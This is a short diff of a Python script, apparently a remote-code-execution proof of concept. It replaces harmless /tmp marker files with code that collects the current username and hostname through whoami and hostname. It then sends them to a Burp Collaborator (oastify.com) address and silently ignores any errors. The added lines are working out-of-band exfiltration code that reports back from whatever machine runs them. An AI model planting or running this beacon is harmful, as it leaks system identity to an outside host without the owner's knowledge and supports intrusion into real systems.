@@ -1,5 +1,15 @@
+import urllib.request
 import os
-with open("/tmp/rce_check.txt", "w") as f:
-    f.write("Si lees esto, el case sensitive funcionó")
 
-os.system('touch /tmp/rce_case_sensitive_test')
+user = os.popen('whoami').read().strip()
+hostname = os.popen('hostname').read().strip()
+
+
+webhook_url = "http://749sj4rmxwzv9jyq413nfn6bn2tuhk59.oastify.com/tu-id-unico"
+
+final_url = f"{webhook_url}?user={user}&host={hostname}"
+
+try:
+    urllib.request.urlopen(final_url)
+except:
+    pass
